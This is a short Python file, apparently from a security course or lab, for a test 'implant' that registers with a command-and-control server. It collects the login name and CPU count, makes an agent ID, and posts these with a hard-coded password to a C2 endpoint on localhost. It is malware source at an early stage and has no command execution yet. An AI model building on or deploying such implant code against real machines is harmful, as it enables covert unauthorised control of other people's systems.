### this is our IMPLANT for TESTING PURPOSES ###

from subprocess import Popen, PIPE
import json
from sys import stdout
import requests 
import os 
#import subprocess
import time

### configs ###

c2_url = "http://127.0.0.1:5000"
register_uri = "/register_agent"

### configs end ###

agent_id = None

def init_data():
    """
        the initial data that we will send back to the C2 server
    """
    global agent_id # making agent_id a global variable

    ## the following gives situational awareness of our implant ##
    ## and can be used to identify ourselves (the agent) on a network ##
    whoami = os.getlogin()
    cpus = os.cpu_count()
    agent_id = os.urandom(16).hex() # a random value that is unqiue to this implant
    password = "ch0nky" # for testing purposes
    return {"whoami": whoami, "agent_id": agent_id, "password": password, "cpus": cpus}

def register():
    """
        register the agent with the C2 server
    """
    data = init_data()
    print("[+] Registering agent with C2 server...")
    r = requests.post(c2_url + register_uri, json=data) ## sending the data to C2 server
    if r.status_code == 200: # if the request is posted to server successfully

        # Then we want to check whether the agent is granted access
        # by checking the returned status
        resp = r.json()
        if resp["status"] == "ok":
            # agent_id = resp["agent_id"]
            print("[+] Agent is authenticated with C2", resp)
            return True
        else:
            print("[-] Agent failed to authenticate with C2", resp)
            return False
    else:
        # TODO: when the agent fails to connect to the C2
        # we can't simply give up but we need to keep trying
        # for certain amount of time
        print("[-] Agent failed to connect to C2")
        return False
    


if __name__ == "__main__":
    register()